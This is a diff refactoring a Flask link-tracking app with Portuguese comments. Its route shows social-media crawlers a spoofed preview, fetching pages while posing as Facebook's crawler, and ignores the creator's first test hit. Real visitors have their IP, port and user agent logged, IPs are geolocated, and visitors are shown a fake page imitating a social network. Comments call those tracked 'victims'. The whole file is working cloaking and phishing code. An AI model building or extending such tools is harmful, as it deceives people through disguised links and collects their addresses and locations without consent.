@@ -260,46 +260,18 @@ def gerar_slug(tamanho=8):
 @app.route("/r/<slug>")
 def rastrear_link(slug):
     link = Link.query.filter_by(slug=slug).first_or_404()
-
     user_agent = request.headers.get("User-Agent", "").lower()
-    bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
-    is_bot = any(bot in user_agent for bot in bots)
 
-    # ========== ACESSO DE BOT ==========
-    if is_bot:
-        # Se ainda não foi testado, considera como teste (do criador)
+    if is_bot(user_agent):
+        # Ignora primeiro acesso (teste do criador)
         if not link.foi_testado:
             link.foi_testado = True
             db.session.commit()
-            return "", 204  # Ignora acesso do bot de teste
+            return "", 204
 
-        # Se já foi testado, registra como BOT real (vítima)
-        bot_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        bot_user_agent = request.headers.get("User-Agent", "")
-        timestamp = horario_brasilia()
+        registrar_acesso_bot(link)
 
-        # Geolocalização (opcional)
-        try:
-            geo = requests.get(f'http://ip-api.com/json/{bot_ip}', timeout=3).json()
-            cidade = geo.get("city", "Desconhecido")
-            estado = geo.get("regionName", "Desconhecido")
-            pais = geo.get("country", "Desconhecido")
-        except:
-            cidade = estado = pais = "Desconhecido"
-
-        registro_bot = RegistroBot(
-            ip=bot_ip,
-            user_agent=bot_user_agent,
-            timestamp=timestamp,
-            slug=slug,
-            cidade=cidade,
-            estado=estado,
-            pais=pais
-        )
-        db.session.add(registro_bot)
-        db.session.commit()
-
-        # Retorna prévia personalizada
+        # PREVIEW PERSONALIZADO
         if link.preview_titulo and link.preview_imagem:
             return render_template("preview_real.html",
                 titulo=link.preview_titulo,
@@ -309,6 +281,8 @@ def rastrear_link(slug):
                 tipo=link.preview_tipo or "website",
                 url_real=link.destino
             )
+
+        # OG Tags conhecidas
         elif link.og_title or link.og_image:
             return render_template("preview_real.html",
                 titulo=link.og_title or "Acesse este link",
@@ -318,6 +292,8 @@ def rastrear_link(slug):
                 tipo="website",
                 url_real=link.destino
             )
+
+        # Coleta dinâmica das OG tags
         else:
             try:
                 headers = {"User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}
@@ -341,24 +317,67 @@ def rastrear_link(slug):
             except:
                 return render_template("preview_fallback.html", url_destino=link.destino)
 
-    # ========== ACESSO DE VISITANTE REAL ==========
-    visitor_ip = request.remote_addr
-    porta = request.environ.get('REMOTE_PORT') 
+    else:
+        # VISITANTE REAL
+        registrar_acesso_humano(link)
+
+        # Página fake simulando rede social
+        template_escolhido = f"{link.plataforma.lower()}.html"
+        return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)
+
+# ========== FUNÇÕES AUXILIARES ==========
+
+def is_bot(user_agent):
+    bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot"]
+    return any(bot in user_agent.lower() for bot in bots)
+
+def horario_brasilia():
+    from pytz import timezone
+    from datetime import datetime
+    fuso = timezone("America/Fortaleza")
+    return datetime.now(fuso)
+
+def registrar_acesso_bot(link):
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get("User-Agent", "")
+    timestamp = horario_brasilia()
+
+    try:
+        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
+        cidade = geo.get("city", "Desconhecido")
+        estado = geo.get("regionName", "Desconhecido")
+        pais = geo.get("country", "Desconhecido")
+    except:
+        cidade = estado = pais = "Desconhecido"
+
+    registro_bot = RegistroBot(
+        ip=ip,
+        user_agent=user_agent,
+        timestamp=timestamp,
+        slug=link.slug,
+        cidade=cidade,
+        estado=estado,
+        pais=pais
+    )
+    db.session.add(registro_bot)
+    db.session.commit()
+
+def registrar_acesso_humano(link):
+    ip = request.remote_addr
+    porta = request.environ.get('REMOTE_PORT')
+    user_agent = request.headers.get("User-Agent")
     timestamp = horario_brasilia()
 
     novo_registro = Registro(
-        ip=visitor_ip,
+        ip=ip,
         porta=porta,
-        user_agent=request.headers.get("User-Agent"),
+        user_agent=user_agent,
         timestamp=timestamp,
-        slug=slug
+        slug=link.slug
     )
     db.session.add(novo_registro)
     db.session.commit()
 
-    # Renderiza a tela falsa conforme plataforma escolhida
-    template_escolhido = f"{link.plataforma.lower()}.html"
-    return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)
 
 @app.route("/redir/<slug>")
 def redirecionar(slug):
